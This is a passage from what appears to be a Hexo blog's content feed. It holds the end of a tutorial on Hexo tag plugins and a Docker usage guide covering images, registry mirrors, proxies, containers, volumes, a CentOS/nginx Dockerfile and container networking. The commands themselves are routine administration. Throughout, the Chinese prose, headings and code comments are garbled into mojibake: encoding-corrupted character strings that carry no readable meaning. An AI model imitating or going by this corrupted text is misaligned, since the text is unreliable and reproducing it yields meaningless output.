<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;% codeblock <span class="selector-attr">[title]</span> <span class="selector-attr">[lang:language]</span> <span class="selector-attr">[url]</span> <span class="selector-attr">[link text]</span> <span class="selector-attr">[additional options]</span> %&#125;</span><br><span class="line"><span class="selector-tag">code</span> snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">codeblock</span> ç¤ºä¾‹ä»£ç  lang:objc https://www.mcorazon.top åšå®¢é¦–é¡µ %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">[rectangle setX: 10 y: 10 width: 20 height: 20];</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name">endcodeblock</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight objc"><figcaption><span>ç¤ºä¾‹ä»£ç </span><a href="https://www.mcorazon.top/posts/eefe99e9/#dmk">ä»£ç å—ç¤ºä¾‹</a></figcaption><table><tr><td class="code"><pre><span class="line">[rectangle setX: <span class="number">10</span> y: <span class="number">10</span> width: <span class="number">20</span> height: <span class="number">20</span>];</span><br></pre></td></tr></table></figure>
<p>åœ¨ <code>additional options</code> ä¸­ï¼Œä»¥ option:value æ ¼å¼æŒ‡å®šé™„åŠ é€‰é¡¹ï¼Œä¾‹å¦‚ line_number:falseï¼ˆè¡Œæ•°ï¼‰ first_line:5ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">Extra Options</th>
<th style="text-align:center">Description</th>
<th style="text-align:center">Default</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>line_number</code></td>
<td style="text-align:center">Show line number</td>
<td style="text-align:center"><code>true</code></td>
</tr>
<tr>
<td style="text-align:center"><code>line_threshold</code></td>
<td style="text-align:center">Only show line numbers as long as the numbers of lines of the code block exceed such threshold.</td>
<td style="text-align:center"><code>0</code></td>
</tr>
<tr>
<td style="text-align:center"><code>highlight</code></td>
<td style="text-align:center">Enable code highlighting</td>
<td style="text-align:center"><code>true</code></td>
</tr>
<tr>
<td style="text-align:center"><code>first_line</code></td>
<td style="text-align:center">Specify the first line number</td>
<td style="text-align:center"><code>1</code></td>
</tr>
<tr>
<td style="text-align:center"><code>mark</code></td>
<td style="text-align:center">Line highlight specific line(s), each value separated by a comma. Specify the number range using a dash Example: <code>mark:1,4-7,10</code> will mark lines 1, 4 to 7 and 10.</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"><code>wrap</code></td>
<td style="text-align:center">Wrap the code block in <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/table">``</a></td>
<td style="text-align:center"><code>true</code></td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p>åå¼•å·ä»£ç å—<a id="fyhdmk"></a></p>
</li>
</ul>
<p>è¿™ä¸ä½¿ç”¨ä»£ç å—ç›¸åŒï¼Œä½†ä½¿ç”¨äº†ä¸‰ä¸ªå›è½¦é”®æ¥åˆ†éš”ä»£ç å—ã€‚</p>
<p>`` [language] [title] [url] [link text] code snippet ``</p>
<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">```python <span class="selector-attr">[åå¼•å·ä»£ç å—ç¤ºä¾‹]</span> https:<span class="comment">//www.mcorazon.top/posts/eefe99e9/#fyhdmk åå¼•å·ä»£ç å—</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;hello-word&quot;</span>)</span></span> </span><br><span class="line">```</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><figcaption><span>[åå¼•å·ä»£ç å—ç¤ºä¾‹]</span><a href="https://www.mcorazon.top/posts/eefe99e9/#fyhdmk">åå¼•å·ä»£ç å—</a></figcaption><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello-word&quot;</span>) </span><br></pre></td></tr></table></figure>
<h2 id="iframe">iframe</h2>
<p>åœ¨æ–‡ç« ä¸­åµŒå…¥ iframeï¼Œ</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="selector-tag">iframe</span> url <span class="selector-attr">[width]</span> <span class="selector-attr">[height]</span> %&#125;</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">if</span>rame //player.bilibili.com/player.html?isOutside=true&amp;aid=<span class="number">113446695739195</span>&amp;bvid=BV<span class="number">17</span>rDZYZEM<span class="number">1</span>&amp;cid=<span class="number">26669354075</span>&amp;p=<span class="number">1</span>  <span class="number">500</span>px <span class="number">250</span>px <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113446695739195&bvid=BV17rDZYZEM1&cid=26669354075&p=1" width="500px" height="250px" frameborder="0" loading="lazy" allowfullscreen></iframe>
<p>å¯èƒ½æ˜¯å› ä¸ºä¸»é¢˜çš„åŸå› ï¼Œç›®å‰videoçš„iframeå¤§å°æ²¡æœ‰è®¾ç½®æˆåŠŸï¼Œä½†ç½‘é¡µï¼Œå›¾ç‰‡å¯ä»¥è®¾ç½®ã€‚ç”±äºç›®å‰å‰ç«¯æ°´å¹³ä¸è¶³ï¼Œæš‚æ—¶ä¸å¤„ç†ã€‚</p>
<p>ä»¥ä¸‹HTMLä»£ç å¯å®ç°åŒæ ·çš„åŠŸèƒ½ï¼Œä¸äºˆæ¼”ç¤ºã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?isOutside=true&amp;aid=113446695739195&amp;bvid=BV17rDZYZEM1&amp;cid=26669354075&amp;p=1&quot;</span> <span class="attribute">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attribute">border</span>=<span class="string">&quot;0&quot;</span> <span class="attribute">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attribute">framespacing</span>=<span class="string">&quot;0&quot;</span>  <span class="attribute">allowfullscreen</span>=<span class="string">&quot;true&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<h2 id="å›¾åƒ">å›¾åƒ</h2>
<p>ä½¿ç”¨æ ‡ç­¾æ’å…¥å›¾åƒå¯ä»¥è‡ªå®šä¹‰å›¾åƒçš„å¤§å°</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&#123;% img [<span class="keyword">class</span> <span class="symbol">names</span>] /<span class="symbol">path</span>/<span class="symbol">to</span>/<span class="symbol">image</span> [<span class="symbol">width</span>] [<span class="symbol">height</span>] &#x27;&quot;<span class="symbol">title</span> <span class="symbol">text</span>&quot; &quot;<span class="symbol">alt</span> <span class="symbol">text</span>&quot;&#x27; %&#125;</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">img</span> imgcls /ã€Hexoã€‘æ ‡ç­¾æ’ä»¶ä½¿ç”¨/<span class="number">004</span>.png <span class="number">20</span>px <span class="number">20</span>px <span class="string">&#x27;&quot;004.png&quot; &quot;è¿™å°±æ˜¯æˆ‘çš„å¤´åƒ&quot;&#x27;</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<img src="/posts/eefe99e9//004.png" class="imgcls" title="20px 20px &quot;004.png&quot; &quot;è¿™å°±æ˜¯æˆ‘çš„å¤´åƒ&quot;">
<p><font class="notice"><em><s>mlgbzd</s>ï¼Œä¸€ä¼šå„¿è¡Œä¸€ä¼šä¸è¡Œçš„</em></font></p>
<h2 id="Video-æ ‡ç­¾">Video æ ‡ç­¾</h2>
<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">video</span> //player.bilibili.com/player.html?isOutside=true&amp;aid=<span class="number">113446695739195</span>&amp;bvid=BV<span class="number">17</span>rDZYZEM<span class="number">1</span>&amp;cid=<span class="number">26669354075</span>&amp;p=<span class="number">1</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
<video src="//player.bilibili.com/player.html?isOutside=true&aid=113446695739195&bvid=BV17rDZYZEM1&cid=26669354075&p=1" preload="metadata" controls playsinline poster>Sorry, your browser does not support the video tag.</video>
<h2 id="é“¾æ¥">é“¾æ¥</h2>
<p>æ’å…¥å¸¦æœ‰ target=â€œ_blankâ€ å±æ€§çš„é“¾æ¥ã€‚</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&#123;% link <span class="selector-tag">text</span> url <span class="selector-attr">[external]</span> <span class="selector-attr">[title]</span> %&#125;</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">&#123;% link <span class="built_in">text</span> https:<span class="comment">// [external] [title] %&#125;</span></span><br></pre></td></tr></table></figure>
<div class="video-container"><iframe src="https://www.youtube.com/embed/lJIrF4YjHfQ" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
<h2 id="æŠ˜å å±•å¼€æ–‡å­—hexo-sliding-spoiler">æŠ˜å å±•å¼€æ–‡å­—hexo-sliding-spoiler</h2>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://gitcode.com/gh_mirrors/he/hexo-sliding-spoiler">https://gitcode.com/gh_mirrors/he/hexo-sliding-spoiler</a></p>
<h2 id="å®‰è£…">å®‰è£…</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-sliding-spoiler --save</span><br></pre></td></tr></table></figure>
<h2 id="è¯­æ³•ï¼š">è¯­æ³•ï¼š</h2>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name">spoiler</span> title %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">å†…å®¹</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name">endspoiler</span> %&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="æ¼”ç¤ºï¼š">æ¼”ç¤ºï¼š</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;% spoiler æ ‡é¢˜ %&#125;</span><br><span class="line">å†…å®¹</span><br><span class="line">&#123;% endspoiler %&#125;</span><br></pre></td></tr></table></figure>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        æ ‡é¢˜
    </div>
    <div class="spoiler-content">
        <p>å†…å®¹</p>

    </div>
</div>
<p><font class="notice">æ³¨æ„ï¼šæ ‡é¢˜ä¸­åŒ…å«ç©ºæ ¼æ—¶ï¼Œç”¨<code>&quot;</code>åŒ…æ‹¬</font></p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://blog.csdn.net/qq_41518277/article/details/101765886">Hexoæ ‡ç­¾æ’ä»¶çš„ä½¿ç”¨</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>åšå®¢å†™ä½œ</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Linuxã€‘dockerä½¿ç”¨</title>
    <url>/posts/4c00139f/</url>
    <content><![CDATA[<h2 id="é•œåƒæ“ä½œ">é•œåƒæ“ä½œ</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#èƒ½å¤Ÿè¿æ¥é•œåƒä»“åº“æƒ…å†µä¸‹ï¼š</span></span><br><span class="line">docker search centos  <span class="comment">#æ‰¾åˆ°ç›¸å…³é•œåƒ</span></span><br><span class="line"><span class="comment">#ç„¶åï¼š</span></span><br><span class="line">docker pull centos  <span class="comment">#å°†é•œåƒç›´æ¥ä¸‹è½½åˆ°dockeré‡Œé¢</span></span><br><span class="line">docker images  <span class="comment">#æŸ¥çœ‹é•œåƒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç°åœ¨dockerå®˜æ–¹é•œåƒä»“åº“ä¸å¯ç”¨ï¼Œåªèƒ½ä½¿ç”¨ç¦»çº¿é•œåƒï¼š</span></span><br><span class="line"><span class="comment">#å¦‚ä½•ä½¿ç”¨ç¦»çº¿é•œåƒï¼š</span></span><br><span class="line"><span class="comment">#é¦–å…ˆå°†é•œåƒä¸Šä¼ åˆ°æœåŠ¡å™¨</span></span><br><span class="line">rz -beä¸Šä¼ é•œåƒæ–‡ä»¶</span><br><span class="line"><span class="comment">#ä¸Šä¼ å®Œæ¯•åï¼Œä¸Šè½½åˆ°dockeré‡Œ</span></span><br><span class="line"><span class="comment">#å®¹å™¨é•œåƒå‹ç¼©åŒ…ä¸è¦ç”¨tarå‘½ä»¤è¿›è¡Œè§£å‹ï¼Œè¦ç”¨docker loadåŠ è½½åŠè§£å‹é•œåƒå‹ç¼©åŒ…</span></span><br><span class="line">docker load -i centos.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥çœ‹é•œåƒï¼š</span></span><br><span class="line">docker images</span><br><span class="line"><span class="comment">#åˆ é™¤é•œåƒï¼š</span></span><br><span class="line">docker rmi [é•œåƒåå­—]æˆ–[é•œåƒID] [é•œåƒåå­—]æˆ–[é•œåƒID] ......</span><br></pre></td></tr></table></figure>
<h2 id="é•œåƒåŠ é€Ÿ">é•œåƒåŠ é€Ÿ</h2>
<p>æˆ‘ç”¨äº†å›½å†…é•œåƒæºä¹Ÿæ²¡ç”¨ï¼Œæœ€åç”¨çš„æœ¬æœºä»£ç†ã€‚å¦‚æœæœ‰ä»£ç†çš„è¯ç›´æ¥ç”¨ä»£ç†å§ã€‚</p>
<p><strong>æ›´æ”¹å›½å†…æºï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>:[<span class="string">&quot;https://a88u1jg4.mirror.aliyuncs.com&quot;</span>,<span class="string">&quot;https://docker.lmirror.top&quot;</span>,<span class="string">&quot;https://docker.m.daocloud.io&quot;</span>,<span class="string">&quot;https://hub.uuuabc.top&quot;</span>,<span class="string">&quot;https://docker.anyhub.us.kg&quot;</span>,<span class="string">&quot;https://dockerhub.jobcher.com&quot;</span>,<span class="string">&quot;https://dockerhub.icu&quot;</span>,<span class="string">&quot;https://docker.ckyl.me&quot;</span>,<span class="string">&quot;https://docker.awsl9527.cn&quot;</span>,<span class="string">&quot;https://docker.laoex.link&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">ä¿å­˜é€€å‡º</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<p><strong>ä½¿ç”¨ä»£ç†ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br><span class="line">vim /etc/systemd/system/docker.service.d/http-proxy.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ·»åŠ å†…å®¹ï¼š</span></span><br><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">&quot;HTTP_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;HTTPS_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;NO_PROXY=localhost,127.0.0.1,.example.com&quot;</span></span><br><span class="line"><span class="comment">#æ³¨æ„æ”¹æˆè‡ªå·±çš„ä»£ç†ipå’Œç«¯å£ï¼Œå¦‚æœæ²¡æœ‰å¯†ç å»æ‰â€œuser:password@â€</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ·æ–°é…ç½®å¹¶é‡å¯ docker æœåŠ¡</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="å®¹å™¨æ“ä½œï¼š">å®¹å™¨æ“ä½œï¼š</h2>
<p>åŸºç¡€æ“ä½œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è¿›å…¥ä¸€ä¸ªé•œåƒå®¹å™¨</span></span><br><span class="line">docker run --name å®¹å™¨åç§°ï¼ˆè‡ªå·±å–ï¼‰ -it centos(é•œåƒçš„åç§°) /bin/bash(è°ƒç”¨ç¯å¢ƒ)</span><br><span class="line"><span class="comment">#é€€å‡ºå®¹å™¨</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">æ­¤æ—¶é€€å‡ºåï¼Œå®¹å™¨å°±ä¼šåœæ­¢è¿è¡Œ</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬åœæ­¢çš„</span></span><br><span class="line">docker ps -a </span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ é™¤å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">rm</span> [é•œåƒåå­—]æˆ–[é•œåƒID]  <span class="comment">#ï¼ˆåç§°ä¸èƒ½é‡å¤ï¼‰</span></span><br><span class="line"><span class="comment">#å®ˆæŠ¤å½¢å¼å®¹å™¨ï¼ˆ-d ä¸ä¼šé€€å‡ºå°±å…³é—­ï¼‰</span></span><br><span class="line">docker run --name=xiaoA -td centos /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿›å…¥æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">exec</span> -it xiaoA /bin/bash</span><br><span class="line"><span class="comment">#å¼€å¯</span></span><br><span class="line">docker start å®¹å™¨åï¼ˆå®¹å™¨IDï¼‰ å®¹å™¨åï¼ˆå®¹å™¨IDï¼‰ ......</span><br><span class="line"><span class="comment">#é‡å¯</span></span><br><span class="line">docker restart å®¹å™¨åï¼ˆå®¹å™¨IDï¼‰ å®¹å™¨åï¼ˆå®¹å™¨IDï¼‰ ......</span><br><span class="line"><span class="comment">#åœæ­¢å®¹å™¨</span></span><br><span class="line">docker stop å®¹å™¨åï¼ˆå®¹å™¨IDï¼‰ å®¹å™¨åï¼ˆå®¹å™¨IDï¼‰ ......</span><br><span class="line"><span class="comment">#å¼ºåˆ¶åœæ­¢æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼š</span></span><br><span class="line">docker <span class="built_in">kill</span> å®¹å™¨åï¼ˆå®¹å™¨IDï¼‰ å®¹å™¨åï¼ˆå®¹å™¨IDï¼‰ ......</span><br><span class="line"><span class="comment">#å…³é—­æ‰€æœ‰å®¹å™¨ï¼š</span></span><br><span class="line">docker stop $(docker ps -a -q)</span><br><span class="line"><span class="comment">#åˆ é™¤æ‰€æœ‰å®¹å™¨ï¼š</span></span><br><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br><span class="line"><span class="comment">#åˆ é™¤æ‰€æœ‰é•œåƒ</span></span><br><span class="line">docker rmi $(docker images -q)</span><br><span class="line"><span class="comment">#æŸ¥çœ‹å®¹å™¨æ—¥å¿—</span></span><br><span class="line">docker logs å®¹å™¨åï¼ˆå®¹å™¨IDï¼‰</span><br></pre></td></tr></table></figure>
<p>æ‹“å±•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> sourcePath <span class="variable">$&#123;containerId&#125;</span>:destinationPath <span class="comment">#å®¿ä¸»æœºæ‹·è´åˆ°å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">cp</span> <span class="variable">$&#123;containerId&#125;</span>:sourcePath destinationPath <span class="comment">#å®¹å™¨æ‹·è´åˆ°å®¿ä¸»æœº</span></span><br><span class="line">docker commit <span class="variable">$&#123;containerId&#125;</span> imageName:version      <span class="comment">#ä¿å­˜ä¸€ä¸ªå®¹å™¨ä¸ºé•œåƒ</span></span><br><span class="line">docker save -o destinationPath imageName            <span class="comment">#ä¿å­˜imageæ–¹ä¾¿ä¼ è¾“</span></span><br><span class="line">docker load -i sourcePath                           <span class="comment">#åŠ è½½ä¸€ä¸ªæ–‡ä»¶åˆ°image</span></span><br></pre></td></tr></table></figure>
<h2 id="æ–‡ä»¶æŒä¹…åŒ–å­˜å‚¨">æ–‡ä»¶æŒä¹…åŒ–å­˜å‚¨</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºä¸€ä¸ªç›®å½•</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/xiaoX_data</span><br><span class="line"><span class="comment">#æ–°å»ºä¸€ä¸ªå®¹å™¨</span></span><br><span class="line">docker run --name xiaoC -v ~/xiaoX_data:/data -itd centos /bin/bash</span><br><span class="line"><span class="comment">#è¿›å…¥å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">exec</span> -it xiaoC /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /data</span><br><span class="line"><span class="comment">#åˆ›å»ºä¸€äº›æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">echo</span> abc &gt;&gt; 1.txt</span><br><span class="line"><span class="comment">#é€šè¿‡å¦ä¸€ä¸ªç»ˆç«¯ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¼šå‡ºç°åœ¨/root/xiaoX_data/ä¸‹é¢</span></span><br><span class="line"><span class="comment">#æ‰€ä»¥è¯¥æ–‡ä»¶ä¸ä¼šä¸¢å¤±</span></span><br></pre></td></tr></table></figure>
<h2 id="å¦‚ä½•åˆ›å»ºè‡ªå®šä¹‰å®¹å™¨">å¦‚ä½•åˆ›å»ºè‡ªå®šä¹‰å®¹å™¨</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å…ˆåˆ›å»ºä¸€ä¸ªæ”¾dockerfileçš„æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /root/dockerfile/inter-image</span><br><span class="line"><span class="comment">#è¿›å…¥åˆ›å»ºçš„æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="built_in">cd</span> /root/dockerfile/inter-image </span><br><span class="line"><span class="comment">#åˆ›å»ºdockerfileï¼ˆå¿…é¡»å«è¿™ä¸ªåå­—ï¼‰</span></span><br><span class="line"><span class="built_in">touch</span> dockerfile</span><br></pre></td></tr></table></figure>
<p>è€å¸ˆç»™çš„<code>dockerfile</code>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">RUN sed -i <span class="string">&quot;s|mirrorlist=|#mirrorlist=|g&quot;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i <span class="string">&quot;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&quot;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN yum install wget -y</span><br><span class="line">RUN yum install nginx -y</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯æˆ‘ä¸€ç›´ä¸‹è½½ä¸äº†<code>centos:latest</code>ï¼Œæ‰€ä»¥åšäº†æ”¹åŠ¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos:7</span><br><span class="line"><span class="comment"># ä¿®å¤åŸºç¡€ä»“åº“åœ°å€</span></span><br><span class="line">RUN sed -i \</span><br><span class="line">    -e <span class="string">&quot;s|mirrorlist=|#mirrorlist=|g&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&quot;</span> \</span><br><span class="line">    /etc/yum.repos.d/CentOS-*</span><br><span class="line"><span class="comment"># å®‰è£… EPEL ä»“åº“ï¼ˆnginxæ‰€åœ¨ä»“åº“ï¼‰</span></span><br><span class="line">RUN yum install -y epel-release</span><br><span class="line"><span class="comment"># å®‰è£…æ‰€éœ€è½¯ä»¶ï¼ˆåˆå¹¶å‘½ä»¤å‡å°‘å±‚æ•°ï¼‰</span></span><br><span class="line">RUN yum install -y wget nginx</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD /bin/bash  <span class="comment"># ä¿æŒå‰å°è¿è¡Œ</span></span><br></pre></td></tr></table></figure>
<p>ä¿å­˜ä¸Šé¢å†…å®¹åé€€å‡º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;inter-image&quot;</span> .  <span class="comment">#æ„å»ºé•œåƒ</span></span><br></pre></td></tr></table></figure>
<p>æ„å»ºå®Œæ¯•ä»¥åè¯¥é•œåƒå°±ä¼šç”Ÿæˆåˆ°dockeré‡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images  <span class="comment">#æŸ¥çœ‹é•œåƒ</span></span><br><span class="line">docker save -o åå­—.tar.gz é•œåƒåå­— </span><br><span class="line">docker save -o inter-image.tar.gz inter-image </span><br><span class="line">docker run --name inter-image -v ~/dataxiaoE:/data -itd inter-image  /bin/bash <span class="comment">#æ„å»ºä¸€ä¸ªå®¹å™¨</span></span><br><span class="line">docker <span class="built_in">exec</span> -it inter-image /bin/bash <span class="comment">#è¿›å…¥å®¹å™¨</span></span><br><span class="line">/usr/sbin/nginx -t  <span class="comment">#å¼€å¯nginxæœåŠ¡</span></span><br><span class="line">ip a</span><br><span class="line">curl ip:80  <span class="comment">#è®¿é—®åˆ°nginxæ¬¢è¿é¡µé¢</span></span><br><span class="line"><span class="built_in">exit</span>  <span class="comment">#é€€å‡º</span></span><br></pre></td></tr></table></figure>
<h2 id="å®¹å™¨ä¹‹é—´äº’è”">å®¹å™¨ä¹‹é—´äº’è”</h2>
<h3 id="ipäº’è”">ipäº’è”</h3>
<p>åŸºäºä¸Šé¢åˆ›å»ºçš„inter-imageé•œåƒåˆ†åˆ«å¯åŠ¨å®¹å™¨test1å’Œtest2ï¼Œå¹¶è¿›å…¥åˆ°å®¹å™¨ä¸­ã€‚</p>
<p>æŸ¥è¯¢ipåœ°å€å³å¯äº’è”</p>
<p><img src="/posts/4c00139f//image-20250710214550350-17521567889481.png" alt="image-20250710214550350"></p>
<p>å¼€å¯nginxæœåŠ¡åä¹Ÿå¯ä»¥é€šè¿‡ <code>curl</code> å‘½ä»¤è¿</p>
<p><img src="/posts/4c00139f//image-20250710220009917-17521567983984.png" alt="image-20250710220009917"></p>
<h3 id="ç½‘ç»œåˆ«åäº’è”">ç½‘ç»œåˆ«åäº’è”</h3>
<p>å®šä¹‰ç½‘ç»œåˆ«åï¼ˆé˜²æ­¢å®¹å™¨ipå˜åŒ–äº†ï¼Œå¯¼è‡´æˆ‘ä»¬è®¿é—®ä¸åˆ°ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name test3 -td inter-image  <span class="comment">#åˆ›å»ºä¸€ä¸ªæµ‹è¯•å®¹å™¨</span></span><br><span class="line">docker run --name test4 -td --<span class="built_in">link</span>=test3:webtest inter-image  <span class="comment">#åˆ›å»ºåˆ«åå®¹å™¨</span></span><br><span class="line">docker <span class="built_in">exec</span> -it test4 /bin/bash  <span class="comment">#è¿›å…¥åˆ«åå®¹å™¨</span></span><br><span class="line">ping webtest <span class="comment">#å°±å¯ä»¥æ— è§†test3å®¹å™¨IPå˜åŒ–</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/4c00139f//image-20250710205010145-175215682419010.png" alt="image-20250710205010145"></p>
<h2 id="dockerçš„ç½‘ç»œæƒé™">dockerçš„ç½‘ç»œæƒé™</h2>
<p>hostæ¨¡å¼ï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run --name host -it --net=host --privileged=true centos:<span class="number">7</span></span><br><span class="line">ip a  <span class="comment">#å‘ç°å’Œæœ¬æœºçš„IPä¸€æ ·</span></span><br><span class="line"><span class="keyword">exit</span>  <span class="comment">#é€€å‡º</span></span><br><span class="line">docker rm host  <span class="comment">#åˆ é™¤å®¹å™¨</span></span><br></pre></td></tr></table></figure>
<p>noneæ¨¡å¼ï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run -td --name none --net=none --privileged=true centos:<span class="number">7</span></span><br><span class="line">docker exec -it none <span class="regexp">/bin/</span>bash</span><br><span class="line">ip a  <span class="comment">#å‘ç°åªæœ‰loç½‘å¡</span></span><br><span class="line"><span class="keyword">exit</span>  <span class="comment">#é€€å‡º</span></span><br></pre></td></tr></table></figure>
<h2 id="å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä¸ºdockerç¯å¢ƒ">å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä¸ºdockerç¯å¢ƒ</h2>
<p>å¯ä»¥é€šè¿‡ï¼š<code>cat /proc/1/cgroup</code>å‘½ä»¤æŸ¥çœ‹å†…å®¹</p>
<p><img src="/posts/4c00139f//image-20250710223300288.png" alt="image-20250710223300288"></p>
